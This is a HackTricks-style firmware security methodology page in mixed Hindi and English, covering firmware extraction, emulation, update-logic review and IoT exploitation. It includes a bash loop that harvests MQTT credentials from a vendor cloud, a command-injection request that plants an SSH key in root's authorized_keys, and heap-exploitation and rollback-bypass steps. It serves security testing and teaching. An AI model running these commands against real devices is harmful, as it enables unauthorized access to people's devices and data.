# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Introduction**

### Related resources


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware आवश्यक software है जो hardware components और users द्वारा interact किए जाने वाले software के बीच communication को manage और facilitate करके devices को सही तरीके से operate करने में सक्षम बनाता है। यह permanent memory में stored होता है, जिससे device powered on होते ही vital instructions access कर सकता है, और operating system launch होता है। Firmware का examine करना और potential रूप से modify करना security vulnerabilities identify करने में एक critical step है।

## **Gathering Information**

**Gathering information** device के makeup और उसके उपयोग होने वाली technologies को समझने में एक critical initial step है। इस process में निम्न data collect करना शामिल है:

- CPU architecture और वह कौन-सा operating system चलाता है
- Bootloader specifics
- Hardware layout और datasheets
- Codebase metrics और source locations
- External libraries और license types
- Update histories और regulatory certifications
- Architectural और flow diagrams
- Security assessments और identified vulnerabilities

इस purpose के लिए, **open-source intelligence (OSINT)** tools invaluable हैं, साथ ही उपलब्ध open-source software components का manual और automated review processes के जरिए analysis भी। [Coverity Scan](https://scan.coverity.com) और [Semmle’s LGTM](https://lgtm.com/#explore) जैसे tools free static analysis offer करते हैं, जिन्हें potential issues ढूंढने के लिए leverage किया जा सकता है।

## **Acquiring the Firmware**

Firmware प्राप्त करने के लिए विभिन्न तरीकों का उपयोग किया जा सकता है, जिनमें से हर एक की अपनी complexity level होती है:

- **Directly** source से (developers, manufacturers)
- दिए गए instructions से इसे **Building** करना
- official support sites से **Downloading** करना
- hosted firmware files ढूंढने के लिए **Google dork** queries का उपयोग करना
- [S3Scanner](https://github.com/sa7mon/S3Scanner) जैसे tools के साथ सीधे **cloud storage** access करना
- man-in-the-middle techniques के जरिए **updates** intercept करना
- **UART**, **JTAG**, या **PICit** जैसे connections के माध्यम से device से **Extracting** करना
- device communication के भीतर update requests के लिए **Sniffing** करना
- **hardcoded update endpoints** की पहचान करना और उनका उपयोग करना
- bootloader या network से **Dumping** करना
- जब बाकी सब fail हो जाए, तो उचित hardware tools का उपयोग करके storage chip को **Removing and reading** करना

### UART-only logs: force a root shell via U-Boot env in flash

If UART RX is ignored (logs only), you can still force an init shell by **editing the U-Boot environment blob** offline:

1. SOIC-8 clip + programmer (3.3V) के साथ SPI flash dump करें:
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. U-Boot env partition locate करें, `bootargs` को `init=/bin/sh` शामिल करने के लिए edit करें, और blob के लिए **U-Boot env CRC32** को recompute करें।
3. केवल env partition को reflash करें और reboot करें; UART पर एक shell appear होना चाहिए।

यह embedded devices पर उपयोगी है जहाँ bootloader shell disabled होता है लेकिन external flash access के जरिए env partition writable होता है।

## Analyzing the firmware

अब जब आपके पास **firmware** है, आपको इसे analyze करने के लिए इसके बारे में information extract करनी होगी कि इसे कैसे handle करना है। इसके लिए आप जिन different tools का use कर सकते हैं:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
यदि आपको उन tools से ज़्यादा कुछ नहीं मिलता, तो `binwalk -E <bin>` से image की **entropy** चेक करें; अगर entropy कम है, तो उसके encrypted होने की संभावना कम है। अगर entropy ज़्यादा है, तो इसके encrypted होने की संभावना है (या किसी तरह compressed)।

इसके अलावा, आप इन tools का उपयोग firmware के अंदर embedded **files** निकालने के लिए कर सकते हैं:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

या file की inspection के लिए [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) का उपयोग करें।

### Filesystem प्राप्त करना

पिछले commented tools जैसे `binwalk -ev <bin>` के साथ आप **filesystem extract** कर पाए होंगे।\
Binwalk आमतौर पर इसे **filesystem type** वाले एक **folder** में extract करता है, जो आमतौर पर इनमें से एक होता है: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

कभी-कभी, binwalk के signatures में filesystem का **magic byte** नहीं होगा। ऐसे मामलों में, binwalk का उपयोग करके filesystem का **offset** ढूंढें और binary से compressed filesystem को **carve** करें, फिर नीचे दिए गए steps के अनुसार उसके type के हिसाब से filesystem को **manually extract** करें।
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
dd कमांड चलाकर Squashfs filesystem को carve करें।
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
वैकल्पिक रूप से, निम्न command भी चलाया जा सकता है।

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs के लिए (ऊपर दिए गए example में उपयोग किया गया)

`$ unsquashfs dir.squashfs`

इसके बाद files "`squashfs-root`" directory में होंगी।

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 filesystems के लिए

`$ jefferson rootfsfile.jffs2`

- NAND flash वाले ubifs filesystems के लिए

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware का विश्लेषण

एक बार firmware प्राप्त हो जाने पर, इसकी संरचना और संभावित vulnerabilities को समझने के लिए इसका dissect करना आवश्यक है। इस process में firmware image से मूल्यवान data का analyze और extract करने के लिए विभिन्न tools का उपयोग शामिल है।

### Initial Analysis Tools

binary file (जिसे `<bin>` कहा गया है) की प्रारंभिक inspection के लिए commands का एक set दिया गया है। ये commands file types की पहचान करने, strings निकालने, binary data का analyze करने, और partition तथा filesystem details को समझने में मदद करती हैं:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
इमेज की encryption status का आकलन करने के लिए, **entropy** को `binwalk -E <bin>` के साथ checked किया जाता है। Low entropy encryption की कमी का संकेत देती है, जबकि high entropy possible encryption या compression को indicate करती है।

**embedded files** को extract करने के लिए, **file-data-carving-recovery-tools** documentation और file inspection के लिए **binvis.io** जैसे tools और resources recommended हैं।

### Extracting the Filesystem

`binwalk -ev <bin>` का उपयोग करके, आमतौर पर filesystem extract किया जा सकता है, अक्सर filesystem type के नाम पर बनी directory में (e.g., squashfs, ubifs)। हालांकि, जब **binwalk** missing magic bytes के कारण filesystem type को recognize करने में fail हो जाता है, तब manual extraction necessary होती है। इसमें filesystem का offset locate करने के लिए `binwalk` का उपयोग किया जाता है, जिसके बाद `dd` command से filesystem को carve out किया जाता है:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
इसके बाद, filesystem type (e.g., squashfs, cpio, jffs2, ubifs) के आधार पर, contents को manually extract करने के लिए अलग-अलग commands का उपयोग किया जाता है।

### Filesystem Analysis

Filesystem extract होने के बाद, security flaws की search शुरू होती है। insecure network daemons, hardcoded credentials, API endpoints, update server functionalities, uncompiled code, startup scripts, और compiled binaries पर offline analysis के लिए ध्यान दिया जाता है।

**Key locations** और **items** जिन्हें inspect करना है, उनमें शामिल हैं:

- user credentials के लिए **etc/shadow** और **etc/passwd**
- **etc/ssl** में SSL certificates और keys
- potential vulnerabilities के लिए configuration और script files
- further analysis के लिए embedded binaries
- Common IoT device web servers और binaries

Filesystem के भीतर sensitive information और vulnerabilities uncover करने में कई tools मदद करते हैं:

- sensitive information search के लिए [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) और [**Firmwalker**](https://github.com/craigz28/firmwalker)
- comprehensive firmware analysis के लिए [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- static और dynamic analysis के लिए [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), और [**EMBA**](https://github.com/e-m-b-a/emba)

### Security Checks on Compiled Binaries

Filesystem में मिलने वाले source code और compiled binaries, दोनों की vulnerabilities के लिए scrutiny करनी चाहिए। **checksec.sh** जैसे tools Unix binaries के लिए और **PESecurity** Windows binaries के लिए उन unprotected binaries की पहचान करने में मदद करते हैं जिन्हें exploit किया जा सकता है।

## Harvesting cloud config and MQTT credentials via derived URL tokens

कई IoT hubs अपनी per-device configuration एक cloud endpoint से fetch करते हैं जो इस तरह दिखता है:

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analysis के दौरान आप पा सकते हैं कि `<token>` device ID से locally एक hardcoded secret का उपयोग करके derive किया जाता है, उदाहरण के लिए:

- token = MD5( deviceId || STATIC_KEY ) और uppercase hex में represented

यह design किसी भी व्यक्ति को, जो deviceId और STATIC_KEY जानता है, URL reconstruct करने और cloud config pull करने की सुविधा देता है, जिससे अक्सर plaintext MQTT credentials और topic prefixes reveal हो जाते हैं।

Practical workflow:

1) UART boot logs से deviceId extract करें

- 3.3V UART adapter (TX/RX/GND) connect करें और logs capture करें:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- cloud config URL pattern और broker address प्रिंट करने वाली lines ढूंढें, उदाहरण के लिए:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) firmware से STATIC_KEY और token algorithm recover करें

- binaries को Ghidra/radare2 में load करें और config path ("/pf/") या MD5 usage search करें।
- algorithm confirm करें (e.g., MD5(deviceId||STATIC_KEY)).
- Bash में token derive करें और digest को uppercase करें:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) cloud config और MQTT credentials को harvest करें

- URL compose करें और curl से JSON pull करें; secrets extract करने के लिए jq से parse करें:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) plaintext MQTT और weak topic ACLs का abuse करें (यदि मौजूद हों)

- recovered credentials का उपयोग करके maintenance topics को subscribe करें और sensitive events खोजें:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) पूर्वानुमेय device IDs की enumerate करें (scale पर, authorization के साथ)

- कई ecosystems में vendor OUI/product/type bytes embed होते हैं, जिनके बाद sequential suffix आता है।
- आप candidate IDs iterate कर सकते हैं, tokens derive कर सकते हैं और configs programmatically fetch कर सकते हैं:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- हमेशा mass enumeration का प्रयास करने से पहले स्पष्ट authorization प्राप्त करें।
- जब संभव हो, target hardware को modify किए बिना secrets recover करने के लिए emulation या static analysis को प्राथमिकता दें।


Firmware का emulation **dynamic analysis** को सक्षम करता है, चाहे वह device के operation का हो या किसी individual program का। इस approach में hardware या architecture dependencies से challenges आ सकते हैं, लेकिन root filesystem या specific binaries को matching architecture और endianness वाले device, जैसे Raspberry Pi, या pre-built virtual machine पर transfer करना आगे की testing को आसान बना सकता है।

### Emulating Individual Binaries

Single programs की जांच के लिए, program की endianness और CPU architecture की पहचान करना crucial है।

#### Example with MIPS Architecture

MIPS architecture binary को emulate करने के लिए, इस command का उपयोग किया जा सकता है:
```bash
file ./squashfs-root/bin/busybox
```
और आवश्यक emulation tools इंस्टॉल करने के लिए:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### ARM Architecture Emulation

For ARM binaries, the process is similar, with the `qemu-arm` emulator being utilized for emulation.

### Full System Emulation

Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, facilitate full firmware emulation, automating the process and aiding in dynamic analysis.

## Dynamic Analysis in Practice

At this stage, either a real or emulated device environment is used for analysis. It's essential to maintain shell access to the OS and filesystem. Emulation may not perfectly mimic hardware interactions, necessitating occasional emulation restarts. Analysis should revisit the filesystem, exploit exposed webpages and network services, and explore bootloader vulnerabilities. Firmware integrity tests are critical to identify potential backdoor vulnerabilities.

## Runtime Analysis Techniques

Runtime analysis involves interacting with a process or binary in its operating environment, using tools like gdb-multiarch, Frida, and Ghidra for setting breakpoints and identifying vulnerabilities through fuzzing and other techniques.

For embedded targets without a full debugger, **copy a statically-linked `gdbserver`** to the device and attach remotely:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

On IoT hubs the RF stack is often split between a **radio MCU** and a Linux userland process. A useful workflow is to map the path:

1. **RF frame** on the air
2. **controller-side parser** on the radio MCU
3. **serial/UART text or TLV protocol** forwarded to Linux (for example `/dev/tty*`)
4. **application dispatcher** in the main daemon
5. **protocol-specific handler / state machine**

This architecture creates two reversing targets instead of one. If the controller converts binary radio frames into a textual protocol such as `Group,Command,arg1,arg2,...`, recover:

- The **message groups** and dispatch tables
- Which messages can come from the **network** versus the controller itself
- The exact **manufacturer-specific discriminator fields** (for example Zigbee `manufacturer_code` and custom `cluster_command`)
- Which handlers are only reachable during **commissioning**, discovery, or firmware/model download phases

For Zigbee specifically, capture pairing traffic and check whether the target still relies on the default **Link Key** `ZigBeeAlliance09`. If so, sniffing commissioning traffic may expose the **Network Key**. Zigbee 3.0 install codes reduce this exposure, so note whether the tested device actually enforces them.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL commands are often a better target than standardized clusters because they feed **custom parsing code** and internal **FSMs** with less battle-tested validation.

Practical workflow:

- Reverse the command dispatcher until you find the **vendor-only handler**.
- Recover the **FSM state**, **event**, **check**, **action**, and **next-state** tables.
- Identify **transitional states** that auto-advance and retry/error branches that eventually reset or free attacker-controlled state.
- Confirm which legitimate protocol exchanges are required to place the daemon in the vulnerable state instead of assuming the buggy handler is always reachable.

For timing-sensitive protocols, packet replay from a Python framework may be too slow. A more reliable approach is to emulate a legitimate device on real hardware (for example an **nRF52840**) with a vendor-grade stack so you can expose the correct **endpoints**, **attributes**, and commissioning timing.

### Fragmented-download bug class in embedded daemons

A recurring firmware bug class appears in **fragmented blob/model/configuration downloads**:

1. The **first fragment** (`offset == 0`) stores `ctx->total_size` and allocates `malloc(total_size)`.
2. Later fragments only validate the attacker-controlled **packet-local** fields such as `packet_total_size >= offset + chunk_len`.
3. The copy uses `memcpy(&ctx->buffer[offset], chunk, chunk_len)` without checking against the **original allocated size**.

This lets an attacker send:

- A first valid fragment with a **small** declared total size to force a small heap allocation.
- A later fragment with the **expected offset** but a larger `chunk_len`.
- A forged packet-local size that satisfies the fresh checks while still overflowing the originally allocated buffer.

When the vulnerable path sits behind commissioning logic, exploitation must include enough **device emulation** to drive the target into the expected model-download or blob-download state before sending the malformed fragments.

### Protocol-driven `free()` triggers

In embedded daemons, the easiest way to trigger heap metadata exploitation is often not "wait for cleanup" but **force the protocol's own error handling**:

- Send malformed follow-up fragments to push the FSM into **retry** or **error** states.
- Exceed the retry threshold so the daemon **resets context** and frees the corrupted buffer.
- Use this predictable `free()` to trigger allocator-side primitives before the process crashes for unrelated reasons.

This is especially useful against **musl/uClibc/dlmalloc-like** allocators in embedded Linux, where corrupting chunk metadata can turn unlink/unbin logic into a write primitive. A stable pattern is to corrupt a **size field** to redirect allocator traversal into **fake chunks staged inside the overflowed buffer**, instead of immediately clobbering real bin pointers and crashing the process.

## Binary Exploitation and Proof-of-Concept

Developing a PoC for identified vulnerabilities requires a deep understanding of the target architecture and programming in lower-level languages. Binary runtime protections in embedded systems are rare, but when present, techniques like Return Oriented Programming (ROP) may be necessary.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc uses fastbins similar to glibc. A later large allocation can trigger `__malloc_consolidate()`, so any fake chunk must survive checks (sane size, `fd = 0`, and surrounding chunks seen as "in use").
- **Non-PIE binaries under ASLR:** if ASLR is enabled but the main binary is **non-PIE**, in-binary `.data/.bss` addresses are stable. You can target a region that already resembles a valid heap chunk header to land a fastbin allocation on a **function pointer table**.
- **Parser-stopping NUL:** when JSON is parsed, a `\x00` in the payload can stop parsing while keeping trailing attacker-controlled bytes for a stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** a ROP chain that calls `open("/proc/self/mem")`, `lseek()`, and `write()` can plant executable shellcode in a known mapping and jump to it.

## Prepared Operating Systems for Firmware Analysis

Operating systems like [AttifyOS](https://github.com/adi0x90/attifyos) and [EmbedOS](https://github.com/scriptingxss/EmbedOS) provide pre-configured environments for firmware security testing, equipped with necessary tools.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS एक distro है जो आपको Internet of Things (IoT) devices का security assessment और penetration testing करने में मदद करने के लिए बनाया गया है. यह सभी आवश्यक tools के साथ pre-configured environment देकर आपका बहुत समय बचाता है.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ubuntu 18.04 पर आधारित embedded security testing operating system, जिसमें firmware security testing tools पहले से loaded हैं.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Even when a vendor implements cryptographic signature checks for firmware images, **version rollback (downgrade) protection is frequently omitted**. When the boot- or recovery-loader only verifies the signature with an embedded public key but does not compare the *version* (or a monotonic counter) of the image being flashed, an attacker can legitimately install an **older, vulnerable firmware that still bears a valid signature** and thus re-introduce patched vulnerabilities.

Typical attack workflow:

1. **Obtain an older signed image**
* Grab it from the vendor’s public download portal, CDN or support site.
* Extract it from companion mobile/desktop applications (e.g. inside an Android APK under `assets/firmware/`).
* Retrieve it from third-party repositories such as VirusTotal, Internet archives, forums, etc.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Many consumer IoT devices expose *unauthenticated* HTTP(S) endpoints that accept Base64-encoded firmware blobs, decode them server-side and trigger recovery/upgrade.
3. After the downgrade, exploit a vulnerability that was patched in the newer release (for example a command-injection filter that was added later).
4. Optionally flash the latest image back or disable updates to avoid detection once persistence is gained.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Vulnerable (downgraded) firmware में, `md5` parameter को बिना sanitisation के सीधे एक shell command में concatenate किया जाता है, जिससे arbitrary commands की injection संभव हो जाती है (यहाँ – SSH key-based root access enable करना)। बाद के firmware versions में एक basic character filter जोड़ा गया, लेकिन downgrade protection की अनुपस्थिति इस fix को बेअसर कर देती है।

### मोबाइल apps से Firmware निकालना

कई vendors अपने companion mobile applications के अंदर full firmware images bundle करते हैं ताकि app Bluetooth/Wi-Fi के जरिए device को update कर सके। ये packages आम तौर पर APK/APEX में unencrypted रूप से `assets/fw/` या `res/raw/` जैसे paths के अंदर stored होते हैं। `apktool`, `ghidra`, या सिर्फ plain `unzip` जैसे tools आपको physical hardware को छुए बिना signed images निकालने देते हैं।
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### A/B slot डिज़ाइनों में Updater-only anti-rollback bypass

कुछ vendors anti-downgrade **ratchet** लागू करते हैं, लेकिन सिर्फ *updater* logic के अंदर (उदाहरण के लिए CAN पर UDS routine, recovery command, या userspace OTA agent)। अगर **bootloader** बाद में सिर्फ image signature/CRC check करता है और partition table या slot metadata पर भरोसा करता है, तो rollback protection को फिर भी bypass किया जा सकता है।

Typical weak design:

- Firmware metadata में version descriptor और एक **security ratchet** / monotonic counter दोनों होते हैं।
- Updater image ratchet को persistent storage में stored value से compare करता है और पुराने signed images को reject करता है।
- Bootloader उस ratchet को **parse नहीं** करता और selected slot boot करने से पहले सिर्फ header, CRC, और signature verify करता है।
- Slot activation को partition table या per-slot generation counter में अलग से store किया जाता है और यह validated exact firmware digest से **cryptographically bound** नहीं होता।

इससे dual-slot systems में एक **validate-one-image / boot-another-image** primitive बनता है। अगर attacker updater को current signed image के साथ slot B को next boot target mark कराने में सफल हो जाए, और बाद में reboot से पहले slot B को overwrite कर सके, तो bootloader फिर भी downgraded image boot कर सकता है क्योंकि वह सिर्फ पहले से committed slot metadata पर भरोसा करता है।

Common abuse pattern:

1. एक **current signed** firmware passive slot में upload करें और normal validation/switch routine चलाएँ ताकि layout उस slot को next active mark करे।
2. **अभी reboot न करें**। उसी session में slot-preparation/erase routine में फिर से enter करें।
3. stale boot-state या stale slot-selection logic का abuse करें ताकि updater उसी **same physical slot** को erase कर दे जिसे अभी promote किया गया था।
4. उस slot में एक **older but still signed** firmware write करें।
5. उस validation routine को skip करें जो ratchet enforce करती है और सीधे reboot करें।
6. Bootloader promoted slot select करता है, सिर्फ signature/integrity verify करता है, और old image boot कर देता है।

A/B update implementations reverse करते समय क्या देखें:

- Slot selection **boot-time flags** से derived हो जो successful switch के बाद refresh नहीं होते।
- `prepare_passive_slot()`-style routine जो **current committed layout** की बजाय stale state के आधार पर slot erase करता है।
- `part_write_layout()`-style function जो सिर्फ एक **generation counter** / active flag bump करता है और validated image hash store नहीं करता।
- Ratchet checks userspace या updater code में implement हों, लेकिन **ROM / bootloader / secure boot** stages में न हों।
- Erase या recovery routines slot को bootable marked रहने दें, even after उसका content removed और rewritten हो गया हो।

### Checklist for Assessing Update Logic

* क्या *update endpoint* का transport/authentication पर्याप्त रूप से protected है (TLS + authentication)?
* क्या device flashing से पहले **version numbers** या **monotonic anti-rollback counter** compare करता है?
* क्या image secure boot chain के अंदर verify होती है (e.g. ROM code द्वारा signatures checked)?
* क्या **bootloader वही ratchet enforce** करता है जो updater करता है, बजाय सिर्फ signature/CRC check करने के?
* क्या slot activation metadata **validated firmware digest/version से bound** है, या promotion के बाद slot modify किया जा सकता है?
* क्या slot switch सफल होने के बाद device को reboot करना force किया जाता है, या बाद की update/erase routines उसी session में अभी भी reachable रहती हैं?
* क्या userland code अतिरिक्त sanity checks perform करता है (e.g. allowed partition map, model number)?
* क्या *partial* या *backup* update flows उसी validation logic को reuse करते हैं?

> 💡  अगर ऊपर में से कोई भी missing है, तो platform शायद rollback attacks के लिए vulnerable है।

## अभ्यास के लिए Vulnerable firmware

Firmware में vulnerabilities discover करने का अभ्यास करने के लिए, निम्न vulnerable firmware projects को starting point के रूप में उपयोग करें।

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
